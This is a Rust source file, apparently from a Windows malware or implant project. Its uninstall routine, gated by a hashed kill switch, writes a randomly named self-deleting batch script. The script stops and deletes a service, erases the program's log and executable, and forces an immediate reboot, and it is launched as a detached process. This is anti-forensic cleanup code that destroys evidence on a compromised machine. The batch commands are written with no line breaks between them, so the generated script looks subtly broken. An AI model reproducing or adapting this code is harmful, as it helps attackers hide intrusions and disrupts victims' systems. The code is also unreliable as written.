use std::env;
use std::error::Error;
use std::fs::File;
use std::io::Write;
use std::os::windows::process::CommandExt;
use std::path::PathBuf;
use std::process::Command;

use crate::config::*;

pub fn uninstall(kill_switch: &str) -> Result<bool, Box<dyn Error>> {
    let kill_switch_hash = lib::hash::sha256(kill_switch.as_bytes(), CRYPTO_KEY);
    if kill_switch_hash != KILL_SWITCH_HASH {
        return Err("invalid killswitch".into());
    }

    let kill_switch_path = PathBuf::from(get_config(BASE_DIR_PATH))
        .join(get_config(KILL_SWITCH_FILE_NAME));

    let mut kill_switch_file = File::create(kill_switch_path)?;
    kill_switch_file.write_all(kill_switch.as_bytes())?;

    let uninstall_script_path = env::temp_dir()
        .join(format!("{}.bat", lib::random::gen_string(5)));

    let log_file = PathBuf::from(get_config(BASE_DIR_PATH))
        .join(get_config(LOG_FILE_NAME));

    let exec_path = env::current_exe()
        .unwrap();

    let mut uninstall_script_file = File::create(&uninstall_script_path)?;
    uninstall_script_file.write_all("ping 1.1.1.1 > nul".as_bytes())?;
    uninstall_script_file.write_all(format!("sc.exe stop \"{}\"", get_config(SERVICE_NAME)).as_bytes())?;
    uninstall_script_file.write_all(format!("sc.exe delete \"{}\"", get_config(SERVICE_NAME)).as_bytes())?;
    uninstall_script_file.write_all(format!("del /f /q \"{}\"", log_file.display()).as_bytes())?;
    uninstall_script_file.write_all(format!("del /f /q \"{}\"", exec_path.display()).as_bytes())?;
    uninstall_script_file.write_all("del /f /q \"%~f0\" > nul".as_bytes())?;
    uninstall_script_file.write_all("shutdown /r /f /t 0".as_bytes())?;

    Command::new(&uninstall_script_path)
        .creation_flags(0x00000008)
        .spawn()?;

    Ok(true)
}